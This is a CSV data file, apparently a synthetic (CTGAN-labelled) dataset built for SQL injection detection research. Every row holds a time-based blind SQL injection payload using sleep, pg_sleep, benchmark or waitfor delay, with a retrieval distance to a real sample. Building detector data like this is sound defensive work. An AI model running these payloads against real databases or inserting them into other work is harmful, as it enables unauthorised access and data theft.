id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000031,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,7.359751434991669
CTGAN_000032,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000724,6.128592331932094
CTGAN_000033,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,6.652695015745408
CTGAN_000034,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000683,5.729151472205767
CTGAN_000035,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,6.2700994516724275
CTGAN_000036,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,5.090312164600251
CTGAN_000037,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",nearest_attack_euclidean,R000416,6.661713429420269
CTGAN_000038,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000436,6.588077752012563
CTGAN_000039,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,7.008897689750089
CTGAN_000040,attack,time,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000235,7.344517825591905
CTGAN_000041,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,4.908246448380585
CTGAN_000042,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,5.646919427733742
CTGAN_000043,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,6.597605059671388
CTGAN_000044,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,8.447660580698555
CTGAN_000045,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000556,4.587226850215498
CTGAN_000046,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,4.95320026598283
CTGAN_000047,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,5.700306648314101
CTGAN_000048,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,7.221950343973583
CTGAN_000049,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000724,5.428085119903432
CTGAN_000050,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,7.1456721395924205
CTGAN_000051,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000728,5.155528567773306
CTGAN_000052,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,6.56617175658472
CTGAN_000053,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,6.150941893153646
CTGAN_000054,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lqwz'  =  'lqwz",nearest_attack_euclidean,R000704,5.783124300847755
CTGAN_000055,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",nearest_attack_euclidean,R000738,6.63933235597367
CTGAN_000056,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,6.52879382213515
CTGAN_000057,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.892441585278096
CTGAN_000058,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,5.138964652336325
CTGAN_000059,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,6.417803001173324
CTGAN_000060,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,6.220476043122191
CTGAN_000061,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,4.724152923456296
CTGAN_000062,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,7.656137115773419
CTGAN_000063,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,7.560063912921945
CTGAN_000064,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,6.373596670239402
CTGAN_000065,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,5.499071266032682
CTGAN_000066,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000184,5.957999582440417
CTGAN_000067,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000216,5.711059547296688
CTGAN_000068,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,7.651202369420618
CTGAN_000069,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000354,8.040227550686877
CTGAN_000070,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.944193299262314
CTGAN_000071,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,8.33452668558252
CTGAN_000072,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,6.043947607899345
CTGAN_000073,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,6.284332907934253
CTGAN_000074,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,5.001773719310166
CTGAN_000075,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,3.9101306422066675
CTGAN_000076,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,5.818934660133978
CTGAN_000077,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,6.098051304403275
CTGAN_000078,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,5.82421328280961
CTGAN_000079,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,6.462740342507117
CTGAN_000080,attack,time,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,nearest_attack_euclidean,R000411,5.965176230946992
CTGAN_000081,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000494,5.888674420265006
CTGAN_000082,attack,time,"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000694,5.688688910064871
CTGAN_000083,attack,time,select sleep  (  5  )   and    (    (   'srfc' like 'srfc,nearest_attack_euclidean,R000204,5.889271743747598
CTGAN_000084,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.294952625260356
CTGAN_000085,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,7.193552243739576
CTGAN_000086,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000482,8.101569691122286
CTGAN_000087,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,4.986277401248417
CTGAN_000088,attack,time,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000668,6.856137965538899
CTGAN_000089,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000315,7.03811829260589
CTGAN_000090,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000214,6.047997576865583
CTGAN_000091,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,6.825798766529949
CTGAN_000092,attack,time,"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000471,7.470525883665077
CTGAN_000093,attack,time,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,nearest_attack_euclidean,R000411,7.270372966281702
CTGAN_000094,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.003146428591953
CTGAN_000095,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000354,5.886618893458291
CTGAN_000096,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000421,5.986484577670871
CTGAN_000097,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R000217,6.463720421046723
CTGAN_000098,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,5.209348466487044
CTGAN_000099,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,5.622546057209478
CTGAN_000100,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000286,6.103944864112786
CTGAN_000101,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,4.743828407297035
CTGAN_000102,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000183,6.857591900149133
CTGAN_000103,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,6.684046002397921
CTGAN_000104,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,6.389503839501785
CTGAN_000105,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,6.349801579631677
CTGAN_000106,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,4.389894414433849
CTGAN_000107,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,6.787788182044907
CTGAN_000108,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,5.664935992156403
CTGAN_000109,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,5.92139101873643
CTGAN_000110,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,5.548461802583198
CTGAN_000111,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,7.014962232674638
CTGAN_000112,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.9157556768014965
CTGAN_000113,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,6.408703918016131
CTGAN_000114,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,4.924074910887312
CTGAN_000115,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,nearest_attack_euclidean,R000628,5.552294808101719
CTGAN_000116,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,4.373502260442864
CTGAN_000117,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000562,6.512446285315687
CTGAN_000118,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,5.785605113750525
CTGAN_000119,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000660,7.192396740800087
CTGAN_000120,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.736142016917013
CTGAN_000121,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,8.77932039527064
CTGAN_000122,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000421,6.750715658534561
CTGAN_000123,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,5.063563258422513
CTGAN_000124,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000226,6.283411416639246
CTGAN_000125,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,4.590315026064677
CTGAN_000126,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,4.7093335105472836
CTGAN_000127,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,8.046217896714671
CTGAN_000128,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,7.253010418378433
CTGAN_000129,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,7.605887647889512
CTGAN_000130,attack,time,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000599,5.266921361729149
CTGAN_000131,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000554,6.516574705152248
CTGAN_000132,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,5.545770794117262
CTGAN_000133,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,6.00165219834638
CTGAN_000134,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,8.150422304633574
CTGAN_000135,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.585240494255455
CTGAN_000136,attack,time," select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",nearest_attack_euclidean,R000653,4.870629611716241
CTGAN_000137,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.7075845118646145
CTGAN_000138,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.795848850929629
CTGAN_000139,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,7.4646998116263354
CTGAN_000140,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,5.957867000225991
CTGAN_000141,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,7.6826152971938315
CTGAN_000142,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R000356,6.157363673500238
CTGAN_000143,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000461,7.882263149107671
CTGAN_000144,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,6.135895700341754
CTGAN_000145,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,8.426846585213399
CTGAN_000146,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,6.242105062756823
CTGAN_000147,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000189,6.247453469571707
CTGAN_000148,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,5.20376639004737
CTGAN_000149,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000724,5.63115276699349
CTGAN_000150,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,5.762537141236858
CTGAN_000151,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,5.2363011690889865
CTGAN_000152,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,7.397039333015724
CTGAN_000153,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000373,6.076891710639817
CTGAN_000154,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,6.248792671414777
CTGAN_000155,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000495,4.974564743665653
CTGAN_000156,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,5.798347185782819
CTGAN_000157,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000656,6.635169330835945
CTGAN_000158,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,7.199129812371319
CTGAN_000159,attack,time,select sleep  (  5  )   and   (  1435  =  1435,nearest_attack_euclidean,R000602,6.7057298376237835
CTGAN_000160,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.896735574012744
CTGAN_000161,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,5.986699022497174
CTGAN_000162,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,6.636642023249354
CTGAN_000163,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,4.6000286690173215
CTGAN_000164,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000608,6.888710619557301
CTGAN_000165,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,6.498642903428291
CTGAN_000166,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000421,5.776195935515959
CTGAN_000167,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,6.510389968267976
CTGAN_000168,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000303,6.041977159209202
CTGAN_000169,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000724,6.733889258587056
CTGAN_000170,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,7.168306907010141
CTGAN_000171,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000461,6.431068566868468
CTGAN_000172,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,7.7328585012452535
CTGAN_000173,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.187683794376601
CTGAN_000174,attack,time,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000585,7.613835888558652
CTGAN_000175,attack,time,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",nearest_attack_euclidean,R000277,6.117790242259817
CTGAN_000176,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000644,6.049304073814426
